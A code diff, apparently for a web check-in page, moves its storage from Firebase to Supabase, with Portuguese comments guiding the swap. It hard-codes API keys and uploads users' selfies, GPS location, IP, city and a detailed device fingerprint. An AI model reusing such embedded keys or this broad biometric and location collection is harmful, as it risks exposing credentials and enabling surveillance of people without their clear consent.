@@ -1,17 +1,12 @@
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getFirestore, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+// 1. SUBSTITUA AS IMPORTAÇÕES DO FIREBASE POR ESTA DO SUPABASE:
+import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm";
 
-const firebaseConfig = {
-  apiKey: "AIzaSyA4tZjjfiOauLn2PPxYAp6ylNqB9LWJkI0",
-  authDomain: "rv-grup.firebaseapp.com",
-  projectId: "rv-grup",
-  storageBucket: "rv-grup.firebasestorage.app",
-  messagingSenderId: "1061419825993",
-  appId: "1:1061419825993:web:5cb7b020efd40b8cf13898"
-};
+// 2. SUBSTITUA O BLOCO 'const firebaseConfig' POR ESTE:
+// Nota: Pegue a URL do seu projeto em Settings -> API -> Project URL no painel do Supabase
+const SUPABASE_URL = "https://SEU_PROJETO_ID.supabase.co"; 
+const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3"; // Sua chave pública enviada
 
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
 const video = document.getElementById("video");
 const btn = document.getElementById("btn");
@@ -184,31 +179,37 @@ btn.addEventListener("click", async () => {
     }
 
     // ======================
-    // FIREBASE
+    // 3. NOVO BLOCO DO SUPABASE (Substituindo o addDoc do Firebase)
     // ======================
     statusText.innerHTML = "💾 Salvando cadastro...";
     falar("Salvando cadastro.");
     
     const infoDispositivo = analisarDispositivo();
 
-    await addDoc(collection(db, "checkins"), {
-      selfies: fotos, 
-      latitude: latitude,
-      longitude: longitude,
-      ip: ip,
-      cidade: cidade,
-      estado: estado,
-      pais: pais,
-      userAgent: navigator.userAgent,
-      modeloDispositivo: infoDispositivo.model,
-      versaoAndroid: infoDispositivo.androidVersion,
-      navegador: infoDispositivo.browser,
-      plataforma: navigator.platform,
-      idioma: navigator.language,
-      larguraTela: window.innerWidth,
-      alturaTela: window.innerHeight,
-      data: serverTimestamp()
-    });
+    const { error } = await supabase
+      .from('checkins')
+      .insert([
+        {
+          selfies: fotos, 
+          latitude: latitude.toString(),
+          longitude: longitude.toString(),
+          ip: ip,
+          cidade: cidade,
+          estado: estado,
+          pais: pais,
+          user_agent: navigator.userAgent,
+          modelo_dispositivo: infoDispositivo.model,
+          versao_android: infoDispositivo.androidVersion,
+          navegador: infoDispositivo.browser,
+          plataforma: navigator.platform,
+          idioma: navigator.language,
+          largura_tela: window.innerWidth,
+          altura_tela: window.innerHeight
+          // O "created_at" é gerado de forma automática pelo banco Postgres
+        }
+      ]);
+
+    if (error) throw error;
 
     // ======================
     // FINAL
